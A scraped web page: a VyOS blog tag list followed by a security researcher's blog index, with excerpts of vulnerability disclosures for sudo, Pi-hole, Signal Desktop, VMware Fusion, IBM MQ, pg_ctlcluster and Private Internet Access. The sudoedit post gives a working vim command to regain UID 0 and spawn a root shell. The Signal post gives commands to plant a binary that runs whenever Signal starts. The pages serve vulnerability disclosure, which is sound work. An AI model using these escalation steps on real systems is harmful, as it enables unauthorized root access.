* [2special offers](https://blog.vyos.io/tag/special-offers)
* [2survey](https://blog.vyos.io/tag/survey)
* [2talk](https://blog.vyos.io/tag/talk)
* [2telemetry](https://blog.vyos.io/tag/telemetry)
* [2thanksgiving](https://blog.vyos.io/tag/thanksgiving)
* [2ubiquiti](https://blog.vyos.io/tag/ubiquiti)
* [2vmware](https://blog.vyos.io/tag/vmware)
* [2vpp](https://blog.vyos.io/tag/vpp)
* [2vrrp](https://blog.vyos.io/tag/vrrp)
* [2wiki](https://blog.vyos.io/tag/wiki)
* [12017](https://blog.vyos.io/tag/2017)
* [12020](https://blog.vyos.io/tag/2020)
* [12021](https://blog.vyos.io/tag/2021)
* [1UI](https://blog.vyos.io/tag/ui)
* [1Work](https://blog.vyos.io/tag/work)
* [1as-path](https://blog.vyos.io/tag/as-path)
* [1australia](https://blog.vyos.io/tag/australia)
* [1badges](https://blog.vyos.io/tag/badges)
* [1build system](https://blog.vyos.io/tag/build-system)
* [1case study](https://blog.vyos.io/tag/case-study)
* [1christmas](https://blog.vyos.io/tag/christmas)
* [1containers](https://blog.vyos.io/tag/containers)
* [1controller](https://blog.vyos.io/tag/controller)
* [1covid-19](https://blog.vyos.io/tag/covid-19)
* [1cyber monday](https://blog.vyos.io/tag/cyber-monday)
* [1dellemc](https://blog.vyos.io/tag/dellemc)
* [1dmvpn](https://blog.vyos.io/tag/dmvpn)
* [1dummy](https://blog.vyos.io/tag/dummy)
* [1edgeos](https://blog.vyos.io/tag/edgeos)
* [1eol](https://blog.vyos.io/tag/eol)
* [1eos](https://blog.vyos.io/tag/eos)
* [1epic fail](https://blog.vyos.io/tag/epic-fail)
* [1event](https://blog.vyos.io/tag/event)
* [1evpn](https://blog.vyos.io/tag/evpn)
* [1fosdem](https://blog.vyos.io/tag/fosdem)
* [1fud](https://blog.vyos.io/tag/fud)
* [1get paid](https://blog.vyos.io/tag/get-paid)
* [1gigaom](https://blog.vyos.io/tag/gigaom)
* [1giveaway](https://blog.vyos.io/tag/giveaway)
* [1greeting](https://blog.vyos.io/tag/greeting)
* [1groups](https://blog.vyos.io/tag/groups)
* [1hcl](https://blog.vyos.io/tag/hcl)
* [1hiring](https://blog.vyos.io/tag/hiring)
* [1ideology](https://blog.vyos.io/tag/ideology)
* [1incident](https://blog.vyos.io/tag/incident)
* [1ipip](https://blog.vyos.io/tag/ipip)
* [1ips](https://blog.vyos.io/tag/ips)
* [1issue notification](https://blog.vyos.io/tag/issue-notification)
* [1japan](https://blog.vyos.io/tag/japan)
* [1jobs](https://blog.vyos.io/tag/jobs)
* [1kernel](https://blog.vyos.io/tag/kernel)
* [1lab](https://blog.vyos.io/tag/lab)
* [1licensing](https://blog.vyos.io/tag/licensing)
* [1load balancing](https://blog.vyos.io/tag/load-balancing)
* [1look at the date](https://blog.vyos.io/tag/look-at-the-date)
* [1look at the post date](https://blog.vyos.io/tag/look-at-the-post-date)
* [1loopback](https://blog.vyos.io/tag/loopback)
* [1market report](https://blog.vyos.io/tag/market-report)
* [1milestone](https://blog.vyos.io/tag/milestone)
* [1monitoring](https://blog.vyos.io/tag/monitoring)
* [1mpls](https://blog.vyos.io/tag/mpls)
* [1mwc](https://blog.vyos.io/tag/mwc)
* [1mwc2024](https://blog.vyos.io/tag/mwc2024)
* [1not-really](https://blog.vyos.io/tag/not-really)
* [1note the date](https://blog.vyos.io/tag/note-the-date)
* [1nutanix ahv](https://blog.vyos.io/tag/nutanix-ahv)
* [1opencollective](https://blog.vyos.io/tag/opencollective)
* [1openssl](https://blog.vyos.io/tag/openssl)
* [1oracle](https://blog.vyos.io/tag/oracle)
* [1ovf](https://blog.vyos.io/tag/ovf)
* [1partnerships](https://blog.vyos.io/tag/partnerships)
* [1political statement](https://blog.vyos.io/tag/political-statement)
* [1pppoe](https://blog.vyos.io/tag/pppoe)
* [1private cloud](https://blog.vyos.io/tag/private-cloud)
* [1python](https://blog.vyos.io/tag/python)
* [1question](https://blog.vyos.io/tag/question)
* [1radhat](https://blog.vyos.io/tag/radhat)
* [1remote access](https://blog.vyos.io/tag/remote-access)
* [1resolved](https://blog.vyos.io/tag/resolved)
* [1rewrite](https://blog.vyos.io/tag/rewrite)
* [1rip](https://blog.vyos.io/tag/rip)
* [1routing](https://blog.vyos.io/tag/routing)
* [1side-projects](https://blog.vyos.io/tag/side-projects)
* [1sit](https://blog.vyos.io/tag/sit)
* [1slack](https://blog.vyos.io/tag/slack)
* [1social media](https://blog.vyos.io/tag/social-media)
* [1ssl](https://blog.vyos.io/tag/ssl)
* [1statistics](https://blog.vyos.io/tag/statistics)
* [1stoprussia](https://blog.vyos.io/tag/stoprussia)
* [1technology exchange](https://blog.vyos.io/tag/technology-exchange)
* [1tunnel](https://blog.vyos.io/tag/tunnel)
* [1ukraine](https://blog.vyos.io/tag/ukraine)
* [1use cases](https://blog.vyos.io/tag/use-cases)
* [1usg](https://blog.vyos.io/tag/usg)
* [1vcne](https://blog.vyos.io/tag/vcne)
* [1versioning](https://blog.vyos.io/tag/versioning)
* [1vmworld](https://blog.vyos.io/tag/vmworld)
* [1vrf](https://blog.vyos.io/tag/vrf)
* [1vyos lab](https://blog.vyos.io/tag/vyos-lab)
* [1wireless](https://blog.vyos.io/tag/wireless)
* [1workaround](https://blog.vyos.io/tag/workaround)
* [1xcp-ng](https://blog.vyos.io/tag/xcp-ng)

[See All Categories](/)



=== Content from blog.mirch.io_13739932_20250126_055321.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[Exploiting Kaseya Unitrends Backup Appliance – Part 1 — May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "Exploiting Kaseya Unitrends Backup Appliance – Part 1")

## [Exploiting Kaseya Unitrends Backup Appliance – Part 1](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/)

[May 20, 2022May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "9:50 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

![](https://blog.mirch.io/wp-content/uploads/2022/05/unitrends-woot.png?w=889)

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

[sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability — January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=712)](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

## [sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability](https://blog.mirch.io/2021/01/25/sudoedit-lpe/)

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named “lowpriv” and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-2.png?w=1024)

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-5.png?w=1024)

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-8.png?w=1024)

Execute a bash shell with !bash.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-9.png?w=198)

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-11.png?w=1024)

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It’s unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

[Pi-hole Patches Critical Stored XSS Vulnerability — December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2020/12/piholexss.png?w=641)](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

## [Pi-hole Patches Critical Stored XSS Vulnerability](https://blog.mirch.io/2020/12/24/pihole-xss/)

[December 24, 2020December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "10:03 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

**References**

* <https://github.com/pi-hole/AdminLTE/pull/1665>

**Timeline**

* 12/16/2020 Vulnerability reported to vendor
* 12/18/2020 Vendor acknowledged receipt of report
* 12/22/2020 Discovered a second XSS payload that would fire on the Long-term Queries Page
* 12/23/2020 Mitre assigns CVE-2020-35659
* 12/24/2020 Vendor released fix in v5.2.2

[Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation — September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation")

## [Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/)

[September 25, 2020September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "3:52 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Today, a Metasploit module was merged for a vulnerability I found in 2018 with [VyOS](https://www.vyos.io/). This vulnerability was my first public InfoSec blog post. I appreciate [bcoles](https://github.com/bcoles) for developing the [exploit/linux/ssh/vyos\_restricted\_shell\_privesc](https://github.com/rapid7/metasploit-framework/pull/14123) module. Read the [Metasploit Wrapup for 9/25/2020](https://blog.rapid7.com/2020/09/25/metasploit-wrap-up-80/). The full write-up can can be found on this blog at [C](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)[VE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/).

[Critical Vulnerabilities Discovered in MoFi Routers — September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "Critical Vulnerabilities Discovered in MoFi Routers")

## [Critical Vulnerabilities Discovered in MoFi Routers](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/)

[September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "1:08 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I discovered several vulnerabilities in the MoFi4500 LTE router. Several vulnerabilities have not been patched, including an unauthenticated remote command injection and several undocumented backdoors. The full write-up can be viewed at <https://www.criticalstart.com/critical-vulnerabilities-discovered-in-mofi-routers/>.

Media Coverage

* <https://www.cyberscoop.com/mofi-networks-routers-zero-day-critical-start/>
* <https://www.zdnet.com/article/backdoors-left-unpatched-in-mofi-routers/>

Follow the conversation on Twitter

> The team is at it again! This time with 10 [#0days](https://twitter.com/hashtag/0days?src=hash&ref_src=twsrc%5Etfw) found by [@0xm1rch](https://twitter.com/0xm1rch?ref_src=twsrc%5Etfw) for routers from [@MoFiNetwork](https://twitter.com/MoFiNetwork?ref_src=twsrc%5Etfw). After coordinating with others to reduce impact there still appears to be over 6,860 vulnerable devices externally facing.[#Infosec](https://twitter.com/hashtag/Infosec?src=hash&ref_src=twsrc%5Etfw) [#redteam](https://twitter.com/hashtag/redteam?src=hash&ref_src=twsrc%5Etfw)<https://t.co/1A1UgRmJrq> [pic.twitter.com/YKPiF4LFMq](https://t.co/YKPiF4LFMq)
>
> — TeamARES (@TeamAresSec) [September 2, 2020](https://twitter.com/TeamAresSec/status/1301200248417775618?ref_src=twsrc%5Etfw)

[CVE-2020-3950 VMware Fusion Elevation of Privilege — March 17, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

[![](https://blog.mirch.io/wp-content/uploads/2020/03/vmware-fusion-cve-2020-3950-cropped.png?w=712)](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

## [CVE-2020-3950 VMware Fusion Elevation of Privilege](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/)

[March 17, 2020April 3, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "10:55 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

VMware Fusion 11.5.~~1~~2 and prior are vulnerable to an elevation of privilege vulnerability. For more details please review the advisory and proof of concept on my Github page [CVE-2020-3950.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh). VMware released a the patch last week and a public advisory [VMSA-2020-0005](https://www.vmware.com/security/advisories/VMSA-2020-0005.html) today however it has been determined that the patch does not properly fix the vulnerability. I reached out to the VMware security team and received a response at 10:31 UTC 2020-03-18 – “We are aware of the situation and working on the next steps”.

I also learned today that [Jeff Ball](https://twitter.com/jeffball55) at [GRIMM](https://twitter.com/grimmcyber) also independently discovered and reported the vulnerability to VMware.  This is a first for me. Make sure to read their excellent detailed write-up <https://blog.grimm-co.com/post/analyzing-suid-binaries/>. You can also follow the thread on Twitter.

> PoC for CVE-2020-3950 VMware Fusion EoP. <https://t.co/F0jGnE9BZu> Vendor Advisory: <https://t.co/28f3aoAFsG> [pic.twitter.com/5WYG9xg5cv](https://t.co/5WYG9xg5cv)
>
> — Rich Mirch (@0xm1rch) [March 17, 2020](https://twitter.com/0xm1rch/status/1240030085450731521?ref_src=twsrc%5Etfw)

### **Related Articles**

* BleepingComputer [VMware Fixes High Severity Privilege Escalation Bug in Fusion](https://www.bleepingcomputer.com/news/security/vmware-fixes-high-severity-privilege-escalation-bug-in-fusion/)
* ZDNet [VMware patches privilege escalation vulnerability in Fusion, Horizon](https://www.zdnet.com/article/vmware-patches-privilege-escalation-vulnerability-in-workstation-fusion-horizon/)
* SecurityWeek [VMware Fixes Privilege Escalation Vulnerability in Fusion for Mac](https://www.securityweek.com/vmware-fixes-privilege-escalation-vulnerability-fusion-mac)
* SecurityWeek [Patch for Recently Disclosed VMware Fusion Vulnerability Incomplete](https://www.securityweek.com/recent-patch-vmware-fusion-vulnerability-incomplete)
* SecurityWeek [VMware Again Fails to Patch Privilege Escalation Vulnerability in Fusion](https://www.securityweek.com/vmware-again-fails-patch-privilege-escalation-vulnerability-fusion)
* Metasploit Module [Blown up by your own Fusion bomb](https://blog.rapid7.com/2020/04/03/metasploit-wrap-up-58/)

[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability — December 18, 2019](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability")

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

## PoC

![signal-lpe-3](https://blog.mirch.io/wp-content/uploads/2020/08/signal-lpe-3.png)

## Timeline

* 2019-12-05: Report sent to Signal security team
* 2019-12-11: Reached out to Signal to verify report was received
* 2019-12-16: Signal acknowledges report
* 2019-12-17: Signal v1.29.1 released
* 2019-12-18: Published this blog post
* 2019-12-24: MITRE assigned CVE-2019-19954

## References

* Commit: [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688)
* Vulnerable version: <https://updates.signal.org/desktop/signal-desktop-win-1.29.0.exe>

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster — November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances. A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It’s important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c) is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9) [e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of  postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources [init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script. pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm) module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

[Continue reading →](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/#more-333)

[CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH — August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

[![](https://blog.mirch.io/wp-content/uploads/2019/08/mqm-woot-4.png?w=712)](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

## [CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)

[August 25, 2019August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "11:37 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[Leave a comment](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#respond)

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ) for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447) along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath) value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use [readelf](http://man7.org/linux/man-pages/man1/readelf.1.html) to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.  We’re using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

```

[Continue reading →](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#more-165)

[CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine — June 10, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

[![](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=659)](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

## [CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/)

[June 10, 2019June 20, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "7:13 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[1 Comment](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#comments)

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

[Continue reading →](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#more-259)

## Posts navigation

[Older posts](https://blog.mirch.io/page/2/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
